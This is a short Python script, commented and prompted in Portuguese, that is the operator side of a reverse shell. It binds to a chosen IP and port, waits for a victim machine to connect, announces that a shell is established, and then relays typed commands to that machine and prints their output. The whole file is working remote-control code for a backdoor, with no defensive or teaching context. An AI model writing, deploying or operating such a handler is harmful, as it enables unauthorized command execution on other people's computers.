import socket
import os
from time import sleep

vermelho = '\033[0;31m'
verde = '\033[0;32m'
amarelo = '\033[0;33m'
fim = '\033[m'

ip_servidor = str(input(f'{amarelo}Digite o ip >>> {fim}'))
porta_servidor = int(input(f'{amarelo}Digite a porta >>> {fim}'))
tamanho_buffer = 1024 * 128
separador = '>>>'

s = socket.socket()

s.bind((ip_servidor, porta_servidor))
s.listen(60)
print('Esperando conexão')

ip_cliente, socket_cliente = s.accept()
os.system('cls')
print(f"{verde}Ip : {socket_cliente[0]} Porta: {porta_servidor} shell estabelecida!!!{fim}")

cwd = ip_cliente.recv(tamanho_buffer).decode()

while True:
    comando_shell = input(f'{cwd}{vermelho}>>>{fim}')
    ip_cliente.send(comando_shell.encode())
    if comando_shell.lower() == 'sair':
        s.close()
    result = ip_cliente.recv(tamanho_buffer).decode()
    resultado = result.split(separador)
    print(''.join(resultado))
